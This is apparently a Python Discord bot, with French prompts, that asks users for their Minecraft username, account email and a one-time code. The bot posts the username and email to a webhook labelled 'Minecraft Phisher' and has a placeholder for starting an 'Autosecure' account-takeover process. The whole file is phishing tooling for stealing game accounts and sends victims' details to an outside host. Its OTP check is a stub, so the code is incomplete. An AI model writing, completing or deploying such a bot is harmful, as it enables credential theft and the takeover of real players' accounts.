import discord
from discord.ext import commands
from discord import Embed, Webhook, RequestsWebhookAdapter
import os
from dotenv import load_dotenv
import requests

load_dotenv()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True

bot = commands.Bot(command_prefix='/', intents=intents)

WEBHOOK_URL = os.getenv("WEBHOOK_URL")

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def embed(ctx):
    embed = Embed(title="Saisissez vos informations Minecraft", description="Veuillez entrer votre pseudo Minecraft et votre email Minecraft.", color=0x00ff00)
    embed.add_field(name="Pseudo Minecraft", value="Entrez votre pseudo Minecraft", inline=False)
    embed.add_field(name="Email Minecraft", value="Entrez votre email Minecraft", inline=False)
    await ctx.send(embed=embed)

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel

    try:
        msg = await bot.wait_for('message', check=check, timeout=60.0)
        pseudo = msg.content.split('\n')[0]
        email = msg.content.split('\n')[1]
        webhook = Webhook.from_url(WEBHOOK_URL, adapter=RequestsWebhookAdapter())
        await webhook.send(f"Pseudo Minecraft: {pseudo}\nEmail Minecraft: {email}", username="Minecraft Phisher")
        await ctx.send("Veuillez entrer le code OTP.")
        otp_msg = await bot.wait_for('message', check=check, timeout=60.0)
        otp = otp_msg.content
        if otp == "valid_otp":  # Remplacez par la logique de validation OTP
            await ctx.send("OTP valide. Démarrage du processus Autosecure.")
            # Ajoutez ici la logique pour démarrer Autosecure
        else:
            await ctx.send("OTP invalide.")
    except TimeoutError:
        await ctx.send("Temps écoulé. Veuillez réessayer.")

@bot.command()
async def setting(ctx, *, new_text):
    with open("settings.txt", "w") as f:
        f.write(new_text)
    await ctx.send(f"Le texte a été mis à jour avec succès: {new_text}")

bot.run(os.getenv("DISCORD_TOKEN"))